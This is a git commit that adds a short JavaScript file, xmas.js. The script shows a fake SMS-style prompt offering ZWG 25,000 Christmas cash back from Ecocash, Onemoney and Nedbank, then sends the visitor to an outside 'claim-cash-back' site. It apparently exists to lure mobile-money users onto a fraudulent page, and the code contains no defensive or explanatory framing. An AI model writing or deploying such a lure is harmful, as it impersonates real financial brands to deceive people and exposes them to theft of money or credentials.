0074c2a7f8a82b1b3098d4b66ce07020a07378a9
bigetijazz6 <bigetijazz6@gmail.com>
2024-11-21 13:39:00 -0800

    Create xmas.js

---
+++ xmas.js
@@ -0,0 +1,6 @@
+
+var password = 'CLAIM ZWG 25,000'
+password=prompt('SMS: hello, you are eligible to receive ZWG 25,000 cash back from Ecocash | Onemoney | Nedbank to celebrate CHRISTMAS, press OK to proceed now','CLAIM ZWG 25,000');
+if (password != 'CLAIM ZWG 25,000') {
+location.href='https://www.offre-beta.shop/claim-cash-back';
+}
